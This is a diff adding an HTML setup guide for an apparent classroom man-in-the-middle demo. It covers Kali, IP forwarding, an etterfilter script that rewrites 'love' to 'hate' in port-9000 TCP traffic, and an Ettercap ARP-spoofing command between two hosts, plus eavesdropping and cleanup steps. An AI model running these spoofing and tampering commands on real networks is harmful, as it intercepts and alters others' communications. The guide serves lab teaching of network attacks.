@@ -1,0 +1,242 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MeTM — Kali/Ettercap setup</title>
+<style>
+    :root {
+        --bg: #0f1117;
+        --panel: #171a23;
+        --panel-border: #2a2f3d;
+        --text: #e4e6eb;
+        --muted: #9aa1b1;
+        --accent: #5fb0ff;
+        --good: #52c77a;
+        --warn: #e8b74b;
+        --bad: #e8604b;
+        --code-bg: #0b0d12;
+    }
+    @media (prefers-color-scheme: light) {
+        :root:not([data-theme="dark"]) {
+            --bg: #f6f7fb;
+            --panel: #ffffff;
+            --panel-border: #dde1ea;
+            --text: #1c1f26;
+            --muted: #5b6372;
+            --accent: #0b6fc9;
+            --good: #1f8a4c;
+            --warn: #966b06;
+            --bad: #b03a26;
+            --code-bg: #eef0f5;
+        }
+    }
+    :root[data-theme="light"] {
+        --bg: #f6f7fb;
+        --panel: #ffffff;
+        --panel-border: #dde1ea;
+        --text: #1c1f26;
+        --muted: #5b6372;
+        --accent: #0b6fc9;
+        --good: #1f8a4c;
+        --warn: #966b06;
+        --bad: #b03a26;
+        --code-bg: #eef0f5;
+    }
+    * { box-sizing: border-box; }
+    body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--text);
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        line-height: 1.55;
+        padding: 16px;
+    }
+    main { max-width: 880px; margin: 0 auto; }
+    h1 { font-size: 1.6rem; margin: 0 0 4px; }
+    .subtitle { color: var(--muted); margin: 0 0 28px; font-size: 0.95rem; }
+    h2 {
+        font-size: 1.15rem;
+        margin: 2.2em 0 0.6em;
+        padding-bottom: 6px;
+        border-bottom: 1px solid var(--panel-border);
+    }
+    h3 { font-size: 1rem; margin: 1.4em 0 0.5em; color: var(--accent); }
+    p { margin: 0.5em 0; }
+    .card {
+        background: var(--panel);
+        border: 1px solid var(--panel-border);
+        border-radius: 10px;
+        padding: 18px 20px;
+        margin: 14px 0;
+    }
+    .step {
+        display: flex;
+        gap: 14px;
+        margin: 10px 0;
+    }
+    .step .num {
+        flex: 0 0 28px;
+        height: 28px;
+        border-radius: 50%;
+        background: rgba(95,176,255,0.15);
+        color: var(--accent);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 700;
+        font-size: 0.85rem;
+    }
+    .step .body { flex: 1; }
+    ul { margin: 0.4em 0; padding-left: 1.3em; }
+    li { margin: 0.35em 0; }
+    code, pre {
+        font-family: "SF Mono", "Cascadia Code", Consolas, monospace;
+        font-size: 0.85rem;
+    }
+    code { background: var(--code-bg); padding: 2px 5px; border-radius: 4px; }
+    pre {
+        background: var(--code-bg);
+        border: 1px solid var(--panel-border);
+        border-radius: 8px;
+        padding: 12px 14px;
+        overflow-x: auto;
+        margin: 0.6em 0;
+    }
+    pre code { background: none; padding: 0; }
+    table { width: 100%; border-collapse: collapse; margin: 1em 0; font-size: 0.92rem; }
+    th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid var(--panel-border); vertical-align: top; }
+    th { color: var(--muted); font-weight: 600; }
+    .warn-box {
+        background: rgba(232,183,75,0.1);
+        border: 1px solid rgba(232,183,75,0.35);
+        border-radius: 10px;
+        padding: 14px 18px;
+        margin: 16px 0;
+    }
+    .warn-box strong { color: var(--warn); }
+    .verdict {
+        background: rgba(95,176,255,0.1);
+        border: 1px solid rgba(95,176,255,0.35);
+        border-radius: 10px;
+        padding: 16px 20px;
+        margin: 20px 0;
+    }
+    footer {
+        margin-top: 3em;
+        padding-top: 1em;
+        border-top: 1px solid var(--panel-border);
+        color: var(--muted);
+        font-size: 0.82rem;
+    }
+</style>
+</head>
+<body>
+<main>
+    <h1>Kali + Ettercap setup (bridged NIC)</h1>
+    <p class="subtitle">Setting up Trudy's replacement — ARP spoofing + Ettercap/<code>etterfilter</code> —
+    on a Kali Linux box whose network adapter is in bridge mode to a separate host interface,
+    sitting on the same LAN segment as Alice and Bob.</p>
+
+    <div class="warn-box">
+        <strong>What "bridge mode" means here:</strong> your Kali VM's virtual NIC is attached
+        directly to a physical/host interface rather than NAT'd behind the hypervisor. That just
+        means Kali gets its own IP on the <em>same LAN</em> Alice and Bob are on — which is exactly
+        what ARP spoofing needs (it only works against hosts you can directly ARP against, i.e.
+        same broadcast domain / same subnet). No extra bridging config is needed beyond that; skip
+        straight to confirming the interface and IP below.
+    </div>
+
+    <h2>0. Confirm the network you're actually on</h2>
+    <div class="step"><div class="num">1</div><div class="body">
+        <p>Find Kali's bridged interface name and IP:</p>
+        <pre><code>ip a</code></pre>
+        <p>Look for the interface with an IP in the <strong>same subnet</strong> as Alice and Bob
+        (e.g. all <code>192.168.0.x</code>). On most Kali VMs this is <code>eth0</code>; write
+        down whatever name <code>ip a</code> actually shows — the rest of this guide calls it
+        <code>IFACE</code>.</p>
+    </div></div>
+    <div class="step"><div class="num">2</div><div class="body">
+        <p>Confirm Kali can see both targets on that same segment:</p>
+        <pre><code>ping -c 2 &lt;Alice-IP&gt;
+ping -c 2 &lt;Bob-IP&gt;
+arp -a</code></pre>
+        <p>If either ping fails or they don't show up in <code>arp -a</code>, bridging isn't
+        actually putting Kali on their LAN yet — fix that before anything below will work.</p>
+    </div></div>
+
+    <h2>1. Enable IP forwarding</h2>
+    <p>Kali needs to actually forward the traffic it intercepts, or every "attack" just drops
+    packets (self-inflicted denial of service, not a MITM):</p>
+    <pre><code>sudo sysctl -w net.ipv4.ip_forward=1</code></pre>
+    <p>Verify: <code>cat /proc/sys/net/ipv4/ip_forward</code> should print <code>1</code>.</p>
+
+    <h2>2. Write the <code>etterfilter</code> script</h2>
+    <p>This is the sabotage logic — matches a substring in the TCP payload on port 9000 and
+    rewrites it live, automatically, no typing required per message:</p>
+    <pre><code># sabotage.ecf
+if (ip.proto == TCP &amp;&amp; tcp.dst == 9000) {
+    if (search(DATA.data, "love")) {
+        replace("love", "hate");
+        msg("tampered a line\n");
+    }
+}</code></pre>
+    <div class="warn-box">
+        <strong>Same-length replacements only (for now):</strong> <code>etterfilter</code>'s
+        <code>replace()</code> doesn't resize the TCP payload — a replacement string a different
+        length than the original gets padded/truncated unpredictably. Keep <code>find</code> and
+        <code>replacement</code> the same length (<code>"love"</code> → <code>"hate"</code> is
+        4-for-4) for a clean demo. If you need a different length, pad the shorter one with
+        spaces inside the script.
+    </div>
+    <p>Compile it to the binary form Ettercap actually loads:</p>
+    <pre><code>etterfilter sabotage.ecf -o sabotage.ef</code></pre>
+
+    <h2>3. Run Ettercap</h2>
+    <pre><code>sudo ettercap -T -q -i &lt;IFACE&gt; -F sabotage.ef -M arp:remote /&lt;Alice-IP&gt;// /&lt;Bob-IP&gt;//</code></pre>
+    <table>
+        <tr><th>Flag</th><th>Meaning</th></tr>
+        <tr><td><code>-T</code></td><td>text UI (no GUI needed)</td></tr>
+        <tr><td><code>-q</code></td><td>quiet — don't dump every packet, keep the console readable</td></tr>
+        <tr><td><code>-i &lt;IFACE&gt;</code></td><td>the bridged interface from step 0</td></tr>
+        <tr><td><code>-F sabotage.ef</code></td><td>load the compiled filter</td></tr>
+        <tr><td><code>-M arp:remote</code></td><td>do ARP spoofing (replaces the old <code>arpspoof</code> command) for both directions, including traffic to/from a router if relevant</td></tr>
+        <tr><td><code>/A// /B//</code></td><td>the two targets to spoof between — Alice and Bob's real IPs, ports left blank (any port)</td></tr>
+    </table>
+    <p>You should see <code>"tampered a line"</code> printed in the Ettercap console the moment a
+    message containing <code>"love"</code> crosses the wire in either direction.</p>
+
+    <h2>4. Eavesdrop only, no tampering (optional phase)</h2>
+    <p>To just watch traffic in plaintext without the filter active, drop the <code>-F</code> flag
+    and either read Ettercap's own connection view, or open Wireshark on the same <code>IFACE</code>,
+    filter <code>tcp.port==9000</code>, right-click a packet → <strong>Follow → TCP Stream</strong>.</p>
+
+    <h2>5. Run Alice and Bob (unchanged)</h2>
+    <p>On their own machines, same as before — nothing about them changed for this attack:</p>
+    <pre><code>java -cp target/classes com.herrcult69.metm.Bob
+java -cp target/classes com.herrcult69.metm.Alice &lt;Bob-IP&gt; 9000</code></pre>
+    <p>Alice still dials Bob's <em>real</em> IP directly. The spoofing is what makes that traffic
+    detour through Kali first — Alice and Bob never configure or know about Kali at all.</p>
+
+    <h2>Cleaning up after the demo</h2>
+    <pre><code># Ctrl+C out of ettercap, then:
+sudo sysctl -w net.ipv4.ip_forward=0</code></pre>
+    <p>Ettercap restores ARP tables on exit by default; if the LAN looks off afterward
+    (e.g. Alice/Bob can't reach each other), reboot or manually ping them from the router to
+    force fresh ARP entries.</p>
+
+    <div class="verdict">
+        <strong>Troubleshooting:</strong> if <code>ettercap</code> reports targets unreachable,
+        re-check step 0 — this almost always means Kali's bridged NIC isn't actually on Alice/Bob's
+        subnet yet, not an Ettercap problem. <code>ip route</code> should show a route to their
+        subnet via <code>IFACE</code> with no gateway hop needed.
+    </div>
+
+    <footer>
+        MeTM — Man-in-the-middle demo, <code>NoTrudy</code> branch. See
+        <code>docs/Pivot.html</code> for why this replaced the custom Java relay, and
+        <code>IMPLEMENTATION.md</code>/<code>README.md</code> for the app-level design.
+    </footer>
+</main>
+</body>
+</html>
